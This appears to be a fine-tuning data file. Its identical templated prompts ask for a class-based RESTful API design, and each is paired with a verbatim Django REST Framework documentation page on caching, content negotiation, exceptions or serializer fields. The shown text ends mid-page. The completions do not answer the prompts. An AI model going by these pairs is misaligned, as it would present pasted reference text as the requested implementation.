request, format=None):\n        content = {\n            \"user_feed\": request.user.get_user_feed(),\n        }\n        return Response(content)\n\n\nclass ProfileView(APIView):\n    # With auth: cache requested url for each user for 2 hours\n    @method_decorator(cache_page(60 * 60 * 2))\n    @method_decorator(vary_on_headers(\"Authorization\"))\n    def get(self, request, format=None):\n        content = {\n            \"user_feed\": request.user.get_user_feed(),\n        }\n        return Response(content)\n\n\nclass PostView(APIView):\n    # Cache page for the requested url\n    @method_decorator(cache_page(60 * 60 * 2))\n    def get(self, request, format=None):\n        content = {\n            \"title\": \"Post title\",\n            \"body\": \"Post content\",\n        }\n        return Response(content)\n```\n\n\n## Using cache with @api_view decorator\n\nWhen using @api_view decorator, the Django-provided method-based cache decorators such as [`cache_page`][page],\n[`vary_on_cookie`][cookie] and [`vary_on_headers`][headers] can be called directly.\n\n```python\nfrom django.views.decorators.cache import cache_page\nfrom django.views.decorators.vary import vary_on_cookie\n\nfrom rest_framework.decorators import api_view\nfrom rest_framework.response import Response\n\n\n@cache_page(60 * 15)\n@vary_on_cookie\n@api_view([\"GET\"])\ndef get_user_list(request):\n    content = {\"user_feed\": request.user.get_user_feed()}\n    return Response(content)\n```\n\n\n**NOTE:** The [`cache_page`][page] decorator only caches the\n`GET` and `HEAD` responses with status 200.\n\n[page]: https://docs.djangoproject.com/en/stable/topics/cache/#the-per-view-cache\n[cookie]: https://docs.djangoproject.com/en/stable/topics/http/decorators/#django.views.decorators.vary.vary_on_cookie\n[headers]: https://docs.djangoproject.com/en/stable/topics/http/decorators/#django.views.decorators.vary.vary_on_headers\n[decorator]: https://docs.djangoproject.com/en/stable/topics/class-based-views/intro/#decorating-the-class\n", "metadata": {"source": "github.com/encode/django-rest-framework", "file_path": "docs/api-guide/caching.md", "language": "markdown", "complexity": "simple", "star_count": 29336, "quality_score": 0.92, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": true, "has_database_design": false, "has_security": true, "has_monitoring": false, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 92}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "api_design", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate class-based implementation for Design RESTful API architecture with proper versioning and documentation with RESTful API design\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "---\nsource:\n    - negotiation.py\n---\n\n# Content negotiation\n\n> HTTP has provisions for several mechanisms for \"content negotiation\" - the process of selecting the best representation for a given response when there are multiple representations available.\n>\n> &mdash; [RFC 2616][cite], Fielding et al.\n\n[cite]: https://www.w3.org/Protocols/rfc2616/rfc2616-sec12.html\n\nContent negotiation is the process of selecting one of multiple possible representations to return to a client, based on client or server preferences.\n\n## Determining the accepted renderer\n\nREST framework uses a simple style of content negotiation to determine which media type should be returned to a client, based on the available renderers, the priorities of each of those renderers, and the client's `Accept:` header.  The style used is partly client-driven, and partly server-driven.\n\n1. More specific media types are given preference to less specific media types.\n2. If multiple media types have the same specificity, then preference is given to based on the ordering of the renderers configured for the given view.\n\nFor example, given the following `Accept` header:\n\n    application/json; indent=4, application/json, application/yaml, text/html, */*\n\nThe priorities for each of the given media types would be:\n\n* `application/json; indent=4`\n* `application/json`, `application/yaml` and `text/html`\n* `*/*`\n\nIf the requested view was only configured with renderers for `YAML` and `HTML`, then REST framework would select whichever renderer was listed first in the `renderer_classes` list or `DEFAULT_RENDERER_CLASSES` setting.\n\nFor more information on the `HTTP Accept` header, see [RFC 2616][accept-header]\n\n---\n\n**Note**: \"q\" values are not taken into account by REST framework when determining preference.  The use of \"q\" values negatively impacts caching, and in the author's opinion they are an unnecessary and overcomplicated approach to content negotiation.\n\nThis is a valid approach as the HTTP spec deliberately underspecifies how a server should weight server-based preferences against client-based preferences.\n\n---\n\n# Custom content negotiation\n\nIt's unlikely that you'll want to provide a custom content negotiation scheme for REST framework, but you can do so if needed.  To implement a custom content negotiation scheme override `BaseContentNegotiation`.\n\nREST framework's content negotiation classes handle selection of both the appropriate parser for the request, and the appropriate renderer for the response, so you should implement both the `.select_parser(request, parsers)` and `.select_renderer(request, renderers, format_suffix)` methods.\n\nThe `select_parser()` method should return one of the parser instances from the list of available parsers, or `None` if none of the parsers can handle the incoming request.\n\nThe `select_renderer()` method should return a two-tuple of (renderer instance, media type), or raise a `NotAcceptable` exception.\n\n## Example\n\nThe following is a custom content negotiation class which ignores the client\nrequest when selecting the appropriate parser or renderer.\n\n    from rest_framework.negotiation import BaseContentNegotiation\n\n    class IgnoreClientContentNegotiation(BaseContentNegotiation):\n        def select_parser(self, request, parsers):\n            \"\"\"\n            Select the first parser in the `.parser_classes` list.\n            \"\"\"\n            return parsers[0]\n\n        def select_renderer(self, request, renderers, format_suffix):\n            \"\"\"\n            Select the first renderer in the `.renderer_classes` list.\n            \"\"\"\n            return (renderers[0], renderers[0].media_type)\n\n## Setting the content negotiation\n\nThe default content negotiation class may be set globally, using the `DEFAULT_CONTENT_NEGOTIATION_CLASS` setting.  For example, the following settings would use our example `IgnoreClientContentNegotiation` class.\n\n    REST_FRAMEWORK = {\n        'DEFAULT_CONTENT_NEGOTIATION_CLASS': 'myapp.negotiation.IgnoreClientContentNegotiation',\n    }\n\nYou can also set the content negotiation used for an individual view, or viewset, using the `APIView` class-based views.\n\n    from myapp.negotiation import IgnoreClientContentNegotiation\n    from rest_framework.response import Response\n    from rest_framework.views import APIView\n\n    class NoNegotiationView(APIView):\n        \"\"\"\n        An example view that does not perform content negotiation.\n        \"\"\"\n        content_negotiation_class = IgnoreClientContentNegotiation\n\n        def get(self, request, format=None):\n            return Response({\n                'accepted media type': request.accepted_renderer.media_type\n            })\n\n[accept-header]: https://www.w3.org/Protocols/rfc2616/rfc2616-sec14.html\n", "metadata": {"source": "github.com/encode/django-rest-framework", "file_path": "docs/api-guide/content-negotiation.md", "language": "markdown", "complexity": "medium", "star_count": 29336, "quality_score": 1.0, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": true, "has_monitoring": false, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 101}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "api_design", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate class-based implementation for Design RESTful API architecture with proper versioning and documentation with RESTful API design\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "---\nsource:\n    - exceptions.py\n---\n\n# Exceptions\n\n> Exceptions… allow error handling to be organized cleanly in a central or high-level place within the program structure.\n>\n> &mdash; Doug Hellmann, [Python Exception Handling Techniques][cite]\n\n## Exception handling in REST framework views\n\nREST framework's views handle various exceptions, and deal with returning appropriate error responses.\n\nThe handled exceptions are:\n\n* Subclasses of `APIException` raised inside REST framework.\n* Django's `Http404` exception.\n* Django's `PermissionDenied` exception.\n\nIn each case, REST framework will return a response with an appropriate status code and content-type.  The body of the response will include any additional details regarding the nature of the error.\n\nMost error responses will include a key `detail` in the body of the response.\n\nFor example, the following request:\n\n    DELETE http://api.example.com/foo/bar HTTP/1.1\n    Accept: application/json\n\nMight receive an error response indicating that the `DELETE` method is not allowed on that resource:\n\n    HTTP/1.1 405 Method Not Allowed\n    Content-Type: application/json\n    Content-Length: 42\n\n    {\"detail\": \"Method 'DELETE' not allowed.\"}\n\nValidation errors are handled slightly differently, and will include the field names as the keys in the response. If the validation error was not specific to a particular field then it will use the \"non_field_errors\" key, or whatever string value has been set for the `NON_FIELD_ERRORS_KEY` setting.\n\nAn example validation error might look like this:\n\n    HTTP/1.1 400 Bad Request\n    Content-Type: application/json\n    Content-Length: 94\n\n    {\"amount\": [\"A valid integer is required.\"], \"description\": [\"This field may not be blank.\"]}\n\n## Custom exception handling\n\nYou can implement custom exception handling by creating a handler function that converts exceptions raised in your API views into response objects.  This allows you to control the style of error responses used by your API.\n\nThe function must take a pair of arguments, the first is the exception to be handled, and the second is a dictionary containing any extra context such as the view currently being handled. The exception handler function should either return a `Response` object, or return `None` if the exception cannot be handled.  If the handler returns `None` then the exception will be re-raised and Django will return a standard HTTP 500 'server error' response.\n\nFor example, you might want to ensure that all error responses include the HTTP status code in the body of the response, like so:\n\n    HTTP/1.1 405 Method Not Allowed\n    Content-Type: application/json\n    Content-Length: 62\n\n    {\"status_code\": 405, \"detail\": \"Method 'DELETE' not allowed.\"}\n\nIn order to alter the style of the response, you could write the following custom exception handler:\n\n    from rest_framework.views import exception_handler\n\n    def custom_exception_handler(exc, context):\n        # Call REST framework's default exception handler first,\n        # to get the standard error response.\n        response = exception_handler(exc, context)\n\n        # Now add the HTTP status code to the response.\n        if response is not None:\n            response.data['status_code'] = response.status_code\n\n        return response\n\nThe context argument is not used by the default handler, but can be useful if the exception handler needs further information such as the view currently being handled, which can be accessed as `context['view']`.\n\nThe exception handler must also be configured in your settings, using the `EXCEPTION_HANDLER` setting key. For example:\n\n    REST_FRAMEWORK = {\n        'EXCEPTION_HANDLER': 'my_project.my_app.utils.custom_exception_handler'\n    }\n\nIf not specified, the `'EXCEPTION_HANDLER'` setting defaults to the standard exception handler provided by REST framework:\n\n    REST_FRAMEWORK = {\n        'EXCEPTION_HANDLER': 'rest_framework.views.exception_handler'\n    }\n\nNote that the exception handler will only be called for responses generated by raised exceptions.  It will not be used for any responses returned directly by the view, such as the `HTTP_400_BAD_REQUEST` responses that are returned by the generic views when serializer validation fails.\n\n---\n\n# API Reference\n\n## APIException\n\n**Signature:** `APIException()`\n\nThe **base class** for all exceptions raised inside an `APIView` class or `@api_view`.\n\nTo provide a custom exception, subclass `APIException` and set the `.status_code`, `.default_detail`, and `.default_code` attributes on the class.\n\nFor example, if your API relies on a third party service that may sometimes be unreachable, you might want to implement an exception for the \"503 Service Unavailable\" HTTP response code.  You could do this like so:\n\n    from rest_framework.exceptions import APIException\n\n    class ServiceUnavailable(APIException):\n        status_code = 503\n        default_detail = 'Service temporarily unavailable, try again later.'\n        default_code = 'service_unavailable'\n\n#### Inspecting API exceptions\n\nThere are a number of different properties available for inspecting the status\nof an API exception. You can use these to build custom exception handling\nfor your project.\n\nThe available attributes and methods are:\n\n* `.detail` - Return the textual description of the error.\n* `.get_codes()` - Return the code identifier of the error.\n* `.get_full_details()` - Return both the textual description and the code identifier.\n\nIn most cases the error detail will be a simple item:\n\n    >>> print(exc.detail)\n    You do not have permission to perform this action.\n    >>> print(exc.get_codes())\n    permission_denied\n    >>> print(exc.get_full_details())\n    {'message':'You do not have permission to perform this action.','code':'permission_denied'}\n\nIn the case of validation errors the error detail will be either a list or\ndictionary of items:\n\n    >>> print(exc.detail)\n    {\"name\":\"This field is required.\",\"age\":\"A valid integer is required.\"}\n    >>> print(exc.get_codes())\n    {\"name\":\"required\",\"age\":\"invalid\"}\n    >>> print(exc.get_full_details())\n    {\"name\":{\"message\":\"This field is required.\",\"code\":\"required\"},\"age\":{\"message\":\"A valid integer is required.\",\"code\":\"invalid\"}}\n\n## ParseError\n\n**Signature:** `ParseError(detail=None, code=None)`\n\nRaised if the request contains malformed data when accessing `request.data`.\n\nBy default this exception results in a response with the HTTP status code \"400 Bad Request\".\n\n## AuthenticationFailed\n\n**Signature:** `AuthenticationFailed(detail=None, code=None)`\n\nRaised when an incoming request includes incorrect authentication.\n\nBy default this exception results in a response with the HTTP status code \"401 Unauthenticated\", but it may also result in a \"403 Forbidden\" response, depending on the authentication scheme in use.  See the [authentication documentation][authentication] for more details.\n\n## NotAuthenticated\n\n**Signature:** `NotAuthenticated(detail=None, code=None)`\n\nRaised when an unauthenticated request fails the permission checks.\n\nBy default this exception results in a response with the HTTP status code \"401 Unauthenticated\", but it may also result in a \"403 Forbidden\" response, depending on the authentication scheme in use.  See the [authentication documentation][authentication] for more details.\n\n## PermissionDenied\n\n**Signature:** `PermissionDenied(detail=None, code=None)`\n\nRaised when an authenticated request fails the permission checks.\n\nBy default this exception results in a response with the HTTP status code \"403 Forbidden\".\n\n## NotFound\n\n**Signature:** `NotFound(detail=None, code=None)`\n\nRaised when a resource does not exist at the given URL. This exception is equivalent to the standard `Http404` Django exception.\n\nBy default this exception results in a response with the HTTP status code \"404 Not Found\".\n\n## MethodNotAllowed\n\n**Signature:** `MethodNotAllowed(method, detail=None, code=None)`\n\nRaised when an incoming request occurs that does not map to a handler method on the view.\n\nBy default this exception results in a response with the HTTP status code \"405 Method Not Allowed\".\n\n## NotAcceptable\n\n**Signature:** `NotAcceptable(detail=None, code=None)`\n\nRaised when an incoming request occurs with an `Accept` header that cannot be satisfied by any of the available renderers.\n\nBy default this exception results in a response with the HTTP status code \"406 Not Acceptable\".\n\n## UnsupportedMediaType\n\n**Signature:** `UnsupportedMediaType(media_type, detail=None, code=None)`\n\nRaised if there are no parsers that can handle the content type of the request data when accessing `request.data`.\n\nBy default this exception results in a response with the HTTP status code \"415 Unsupported Media Type\".\n\n## Throttled\n\n**Signature:** `Throttled(wait=None, detail=None, code=None)`\n\nRaised when an incoming request fails the throttling checks.\n\nBy default this exception results in a response with the HTTP status code \"429 Too Many Requests\".\n\n## ValidationError\n\n**Signature:** `ValidationError(detail=None, code=None)`\n\nThe `ValidationError` exception is slightly different from the other `APIException` classes:\n\n* The `detail` argument may be a list or dictionary of error details, and may also be a nested data structure. By using a dictionary, you can specify field-level errors while performing object-level validation in the `validate()` method of a serializer. For example. `raise serializers.ValidationError({'name': 'Please enter a valid name.'})`\n* By convention you should import the serializers module and use a fully qualified `ValidationError` style, in order to differentiate it from Django's built-in validation error. For example. `raise serializers.ValidationError('This field must be an integer value.')`\n\nThe `ValidationError` class should be used for serializer and field validation, and by validator classes. It is also raised when calling `serializer.is_valid` with the `raise_exception` keyword argument:\n\n    serializer.is_valid(raise_exception=True)\n\nThe generic views use the `raise_exception=True` flag, which means that you can override the style of validation error responses globally in your API. To do so, use a custom exception handler, as described above.\n\nBy default this exception results in a response with the HTTP status code \"400 Bad Request\".\n\n\n---\n\n# Generic Error Views\n\nDjango REST Framework provides two error views suitable for providing generic JSON `500` Server Error and\n`400` Bad Request responses. (Django's default error views provide HTML responses, which may not be appropriate for an\nAPI-only application.)\n\nUse these as per [Django's Customizing error views documentation][django-custom-error-views].\n\n## `rest_framework.exceptions.server_error`\n\nReturns a response with status code `500` and `application/json` content type.\n\nSet as `handler500`:\n\n    handler500 = 'rest_framework.exceptions.server_error'\n\n## `rest_framework.exceptions.bad_request`\n\nReturns a response with status code `400` and `application/json` content type.\n\nSet as `handler400`:\n\n    handler400 = 'rest_framework.exceptions.bad_request'\n\n# Third party packages\n\nThe following third-party packages are also available.\n\n## DRF Standardized Errors\n\nThe [drf-standardized-errors][drf-standardized-errors] package provides an exception handler that generates the same format for all 4xx and 5xx responses. It is a drop-in replacement for the default exception handler and allows customizing the error response format without rewriting the whole exception handler. The standardized error response format is easier to document and easier to handle by API consumers.\n\n[cite]: https://doughellmann.com/blog/2009/06/19/python-exception-handling-techniques/\n[authentication]: authentication.md\n[django-custom-error-views]: https://docs.djangoproject.com/en/stable/topics/http/views/#customizing-error-views\n[drf-standardized-errors]: https://github.com/ghazi-git/drf-standardized-errors\n", "metadata": {"source": "github.com/encode/django-rest-framework", "file_path": "docs/api-guide/exceptions.md", "language": "markdown", "complexity": "complex", "star_count": 29336, "quality_score": 0.98, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": true, "has_monitoring": true, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 274}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "api_design", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate class-based implementation for Design RESTful API architecture with proper versioning and documentation with RESTful API design\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "---\nsource:\n    - fields.py\n---\n\n# Serializer fields\n\n> Each field in a Form class is responsible not only for validating data, but also for \"cleaning\" it &mdash; normalizing it to a consistent format.\n>\n> &mdash; [Django documentation][cite]\n\nSerializer fields handle converting between primitive values and internal datatypes.  They also deal with validating input values, as well as retrieving and setting the values from their parent objects.\n\n---\n\n**Note:** The serializer fields are declared in `fields.py`, but by convention you should import them using `from rest_framework import serializers` and refer to fields as `serializers.<FieldName>`.\n\n---\n\n## Core arguments\n\nEach serializer field class constructor takes at least these arguments.  Some Field classes take additional, field-specific arguments, but the following should always be accepted:\n\n### `read_only`\n\nRead-only fields are included in the API output, but should not be included in the input during create or update operations. Any 'read_only' fields that are incorrectly included in the serializer input will be ignored.\n\nSet this to `True` to ensure that the field is used when serializing a representation, but is not used when creating or updating an instance during deserialization.\n\nDefaults to `False`\n\n### `write_only`\n\nSet this to `True` to ensure that the field may be used when updating or creating an instance, but is not included when serializing the representation.\n\nDefaults to `False`\n\n### `required`\n\nNormally an error will be raised if a field is not supplied during deserialization.\nSet to false if this field is not required to be present during deserialization.\n\nSetting this to `False` also allows the object attribute or dictionary key to be omitted from output when serializing the instance. If the key is not present it will simply not be included in the output representation.\n\nDefaults to `True`. If you're using [Model Serializer](https://www.django-rest-framework.org/api-guide/serializers/#modelserializer), the default value will be `False` when you have specified a `default`, or when the corresponding `Model` field has `blank=True` or `null=True` and is not part of a unique constraint at the same time. (Note that without a `default` value, [unique constraints will cause the field to be required](https://www.django-rest-framework.org/api-guide/validators/#optional-fields).)\n\n### `default`\n\nIf set, this gives the default value that will be used for the field if no input value is supplied. If not set the default behavior is to not populate the attribute at all.\n\nThe `default` is not applied during partial update operations. In the partial update case only fields that are provided in the incoming data will have a validated value returned.\n\nMay be set to a function or other callable, in which case the value will be evaluated each time it is used. When called, it will receive no arguments. If the callable has a `requires_context = True` attribute, then the serializer field will be passed as an argument.\n\nFor example:\n\n    class CurrentUserDefault:\n        \"\"\"\n        May be applied as a `default=...` value on a serializer field.\n        Returns the current user.\n        \"\"\"\n        requires_context = True\n\n        def __call__(self, serializer_field):\n            return serializer_field.context['request'].user\n\nWhen serializing the instance, default will be used if the object attribute or dictionary key is not present in the instance.\n\nNote that setting a `default` value implies that the field is not required. Including both the `default` and `required` keyword arguments is invalid and will raise an error.\n\n### `allow_null`\n\nNormally an error will be raised if `None` is passed to a serializer field. Set this keyword argument to `True` if `None` should be considered a valid value.\n\nNote that, without an explicit `default`, setting this argument to `True` will imply a `default` value of `null` for serialization output, but does not imply a default for input deserialization.\n\nDefaults to `False`\n\n### `source`\n\nThe name of the attribute that will be used to populate the field.  May be a method that only takes a `self` argument, such as `URLField(source='get_absolute_url')`, or may use dotted notation to traverse attributes, such as `EmailField(source='user.email')`.\n\nWhen serializing fields with dotted notation, it may be necessary to provide a `default` value if any object is not present or is empty during attribute traversal. Beware of possible n+1 problems when using source attribute if you are accessing a relational orm model. For example:\n\n    class CommentSerializer(serializers.Serializer):\n        email = serializers.EmailField(source=\"user.email\")\n\nThis case would require user object to be fetched from database when it is not prefetched. If that is not wanted, be sure to be using `prefetch_related` and `select_related` methods appropriately. For more information about the methods refer to [django documentation][django-docs-select-related].\n\nThe value `source='*'` has a special meaning, and is used to indicate that the entire object should be passed through to the field.  This can be useful for creating nested representations, or for fields which require access to the complete object in order to determine the output representation.\n\nDefaults to the name of the field.\n\n### `validators`\n\nA list of validator functions which should be applied to the incoming field input, and which either raise a validation error or simply return. Validator functions should typically raise `serializers.ValidationError`, but Django's built-in `ValidationError` is also supported for compatibility with validators defined in the Django codebase or third party Django packages.\n\n### `error_messages`\n\nA dictionary of error codes to error messages.\n\n### `label`\n\nA short text string that may be used as the name of the field in HTML form fields or other descriptive elements.\n\n### `help_text`\n\nA text string that may be used as a description of the field in HTML form fields or other descriptive elements.\n\n### `initial`\n\nA value that should be used for pre-populating the value of HTML form fields. You may pass a callable to it, just as\nyou may do with any regular Django `Field`:\n\n    import datetime\n    from rest_framework import serializers\n    class ExampleSerializer(serializers.Serializer):\n        day = serializers.DateField(initial=datetime.date.today)\n\n### `style`\n\nA dictionary of key-value pairs that can be used to control how renderers should render the field.\n\nTwo examples here are `'input_type'` and `'base_template'`:\n\n    # Use <input type=\"password\"> for the input.\n    password = serializers.CharField(\n        style={'input_type': 'password'}\n    )\n\n    # Use a radio input instead of a select input.\n    color_channel = serializers.ChoiceField(\n        choices=['red', 'green', 'blue'],\n        style={'base_template': 'radio.html'}\n    )\n\nFor more details see the [HTML & Forms][html-and-forms] documentation.\n\n---\n\n# Boolean fields\n\n## BooleanField\n\nA boolean representation.\n\nWhen using HTML encoded form input be aware that omitting a value will always be treated as setting a field to `False`, even if it has a `default=True` option specified. This is because HTML checkbox inputs represent the unchecked state by omitting the value, so REST framework treats omission as if it is an empty checkbox input.\n\nNote that Django 2.1 removed the `blank` kwarg from `models.BooleanField`.\nPrior to Django 2.1 `models.BooleanField` fields were always `blank=True`. Thus\nsince Django 2.1 default `serializers.BooleanField` instances will be generated\nwithout the `required` kwarg (i.e. equivalent to `required=True`) whereas with\nprevious versions of Django, default `BooleanField` instances will be generated\nwith a `required=False` option.  If you want to control this behavior manually,\nexplicitly declare the `BooleanField` on the serializer class, or use the\n`extra_kwargs` option to set the `required` flag.\n\nCorresponds to `django.db.models.fields.BooleanField`.\n\n**Signature:** `BooleanField()`\n\n---\n\n# String fields\n\n## CharField\n\nA text representation. Optionally validates the text to be shorter than `max_length` and longer than `min_length`.\n\nCorresponds to `django.db.models.fields.CharField` or `django.db.models.fields.TextField`.\n\n**Signature:** `CharField(max_length=None, min_length=None, allow_blank=False, trim_whitespace=True)`\n\n* `max_length` - Validates that the input contains no more than this number of characters.\n* `min_length` - Validates that the input contains no fewer than this number of characters.\n* `allow_blank` - If set to `True` then the empty string should be considered a valid value. If set to `False` then the empty string is considered invalid and will raise a validation error. Defaults to `False`.\n* `trim_whitespace` - If set to `True` then leading and trailing whitespace is trimmed. Defaults to `True`.\n\nThe `allow_null` option is also available for string fields, although its usage is discouraged in favor of `allow_blank`. It is valid to set both `allow_blank=True` and `allow_null=True`, but doing so means that there will be two differing types of empty value permissible for string representations, which can lead to data inconsistencies and subtle application bugs.\n\n## EmailField\n\nA text representation, validates the text to be a valid e-mail address.\n\nCorresponds to `django.db.models.fields.EmailField`\n\n**Signature:** `EmailField(max_length=None, min_length=None, allow_blank=False)`\n\n## RegexField\n\nA text representation, that validates the given value matches against a certain regular expression.\n\nCorresponds to `django.forms.fields.RegexField`.\n\n**Signature:** `RegexField(regex, max_length=None, min_length=None, allow_blank=False)`\n\nThe mandatory `regex` argument may either be a string, or a compiled python regular expression object.\n\nUses Django's `django.core.validators.RegexValidator` for validation.\n\n## SlugField\n\nA `RegexField` that validates the input against the pattern `[a-zA-Z0-9_-]+`.\n\nCorresponds to `django.db.models.fields.SlugField`.\n\n**Signature:** `SlugField(max_length=50, min_length=None, allow_blank=False)`\n\n## URLField\n\nA `RegexField` that validates the input against a URL matching pattern. Expects fully qualified URLs of the form `http://<host>/<path>`.\n\nCorresponds to `django.db.models.fields.URLField`.  Uses Django's `django.core.validators.URLValidator` for validation.\n\n**Signature:** `URLField(max_length=200, min_length=None, allow_blank=False)`\n\n## UUIDField\n\nA field that ensures the input is a valid UUID string. The `to_internal_value` method will return a `uuid.UUID` instance. On output the field will return a string in the canonical hyphenated format, for example:\n\n    \"de305d54-75b4-431b-adb2-eb6b9e546013\"\n\n**Signature:** `UUIDField(format='hex_verbose')`\n\n* `format`: Determines the representation format of the uuid value\n    * `'hex_verbose'` - The canonical hex representation, including hyphens: `\"5ce0e9a5-5ffa-654b-cee0-1238041fb31a\"`\n    * `'hex'` - The compact hex representation of the UUID, not including hyphens: `\"5ce0e9a55ffa654bcee01238041fb31a\"`\n    * `'int'` - A 128 bit integer representation of the UUID: `\"123456789012312313134124512351145145114\"`\n    * `'urn'` - RFC 4122 URN representation of the UUID: `\"urn:uuid:5ce0e9a5-5ffa-654b-cee0-1238041fb31a\"`\n  Changing the `format` parameters only affects representation values. All formats are accepted by `to_internal_value`\n\n## FilePathField\n\nA field whose choices are limited to the filenames in a certain directory on the filesystem\n\nCorresponds to `django.forms.fields.FilePathField`.\n\n**Signature:** `FilePathField(path, match=None, recursive=False, allow_files=True, allow_folders=False, required=None, **kwargs)`\n\n* `path` - The absolute filesystem path to a directory from which this FilePathField should get its choice.\n* `match` - A regular expression, as a string, that FilePathField will use to filter filenames.\n* `recursive` - Specifies whether all subdirectories of path should be included.  Default is `False`.\n* `allow_files` - Specifies whether files in the specified location should be included. Default is `True`. Either this or `allow_folders` must be `True`.\n* `allow_folders` - Specifies whether folders in the specified location should be included. Default is `False`. Either this or `allow_files` must be `True`.\n\n## IPAddressField\n\nA field that ensures the input is a valid IPv4 or IPv6 string.\n\nCorresponds to `django.forms.fields.IPAddressField` and `django.forms.fields.GenericIPAddressField`.\n\n**Signature**: `IPAddressField(protocol='both', unpack_ipv4=False, **options)`\n\n* `protocol` Limits valid inputs to the specified protocol. Accepted values are 'both' (default), 'IPv4' or 'IPv6'. Matching is case-insensitive.\n* `unpack_ipv4` Unpacks IPv4 mapped addresses like ::ffff:192.0.2.1. If this option is enabled that address would be unpacked to 192.0.2.1. Default is disabled. Can only be used when protocol is set to 'both'.\n\n---\n\n# Numeric fields\n\n## IntegerField\n\nAn integer representation.\n\nCorresponds to `django.db.models.fields.IntegerField`, `django.db.models.fields.SmallIntegerField`, `django.db.models.fields.PositiveIntegerField` and `django.db.models.fields.PositiveSmallIntegerField`.\n\n**Signature**: `IntegerField(max_value=None, min_value=None)`\n\n* `max_value` Validate that the number provided is no greater than this value.\n* `min_value` Validate that the number provided is no less than this value.\n\n## FloatField\n\nA floating point representation.\n\nCorresponds to `django.db.models.fields.FloatField`.\n\n**Signature**: `FloatField(max_value=None, min_value=None)`\n\n* `max_value` Validate that the number provided is no greater than this value.\n* `min_value` Validate that the number provided is no less than this value.\n\n## DecimalField\n\nA decimal representation, represented in Python by a `Decimal` instance.\n\nCorresponds to `django.db.models.fields.DecimalField`.\n\n**Signature**: `DecimalField(max_digits, decimal_places, coerce_to_string=None, max_value=None, min_value=None)`\n\n* `max_digits` The maximum number of digits allowed in the number. It must be either `None` or an integer greater than or equal to `decimal_places`.\n* `decimal_places` The number of decimal places to store with the number.\n* `coerce_to_string` Set to `True` if string values should be returned for the representation, or `False` if `Decimal` objects should be returned. Defaults to the same value as the `COERCE_DECIMAL_TO_STRING` settings key, which will be `True` unless overridden. If `Decimal` objects are returned by the serializer, then the final output format will be determined by the renderer. Note that setting `localize` will force the value to `True`.\n* `max_value` Validate that the number provided is no greater than this value. Should be an integer or `Decimal` object.\n* `min_value` Validate that the number provided is no less than this value. Should be an integer or `Decimal` object.\n* `localize` Set to `True` to enable localization of input and output based on the current locale. This will also force `coerce_to_string` to `True`. Defaults to `False`. Note that data formatting is enabled if you have set `USE_L10N=True` in your settings file.\n* `rounding` Sets the rounding mode used when quantizing to the configured precision. Valid values are [`decimal` module rounding modes][python-decimal-rounding-modes]. Defaults to `None`.\n* `normalize_output` Will normalize the decimal value when serialized. This will strip all trailing zeroes and change the value's precision to the minimum required precision to be able to represent the value without losing data. Defaults to `False`.\n\n#### Example usage\n\nTo validate numbers up to 999 with a resolution of 2 decimal places, you would use:\n\n    serializers.DecimalField(max_digits=5, decimal_places=2)\n\nAnd to validate numbers up to anything less than one billion with a resolution of 10 decimal places:\n\n    serializers.DecimalField(max_digits=19, decimal_places=10)\n\n---\n\n# Date and time fields\n\n## DateTimeField\n\nA date and time representation.\n\nCorresponds to `django.db.models.fields.DateTimeField`.\n\n**Signature:** `DateTimeField(format=api_settings.DATETIME_FORMAT, input_formats=None, default_timezone=None)`\n\n* `format` - A string representing the output format. If not specified, this defaults to the same value as the `DATETIME_FORMAT` settings key, which will be `'iso-8601'` unless set. Setting to a format string indicates that `to_representation` return values should be coerced to string output. Format strings are described below. Setting this value to `None` indicates that Python `datetime` objects should be returned by `to_representation`. In this case the datetime encoding will be determined by the renderer.\n* `input_formats` - A list of strings representing the input formats which may be used to parse the date.  If not specified, the `DATETIME_INPUT_FORMATS` setting will be used, which defaults to `['iso-8601']`.\n* `default_timezone` - A `tzinfo` subclass (`zoneinfo` or `pytz`) representing the timezone. If not specified and the `USE_TZ` setting is enabled, this defaults to the [current timezone][django-current-timezone]. If `USE_TZ` is disabled, then datetime objects will be naive.\n\n#### `DateTimeField` format strings.\n\nFormat strings may either be [Python strftime formats][strftime] which explicitly specify the format, or the special string `'iso-8601'`, which indicates that [ISO 8601][iso8601] style datetimes should be used. (eg `'2013-01-29T12:34:56.000000Z'`)\n\nWhen a value of `None` is used for the format `datetime` objects will be returned by `to_representation` and the final output representation will be determined by the renderer class.\n\n#### `auto_now` and `auto_now_add` model fields.\n\nWhen using `ModelSerializer` or `HyperlinkedModelSerializer`, note that any model fields with `auto_now=True` or `auto_now_add=True` will use serializer fields that are `read_only=True` by default.\n\nIf you want to override this behavior, you'll need to declare the `DateTimeField` explicitly on the serializer.  For example:\n\n    class CommentSerializer(serializers.ModelSerializer):\n        created = serializers.DateTimeField()\n\n        class Meta:\n            model = Comment\n\n## DateField\n\nA date representation.\n\nCorresponds to `django.db.models.fields.DateField`\n\n**Signature:** `DateField(format=api_settings.DATE_FORMAT, input_formats=None)`\n\n* `format` - A string representing the output format.  If not specified, this defaults to the same value as the `DATE_FORMAT` settings key, which will be `'iso-8601'` unless set. Setting to a format string indicates that `to_representation` return values should be coerced to string output. Format strings are described below. Setting this value to `None` indicates that Python `date` objects should be returned by `to_representation`. In this case the date encoding will be determined by the renderer.\n* `input_formats` - A list of strings representing the input formats which may be used to 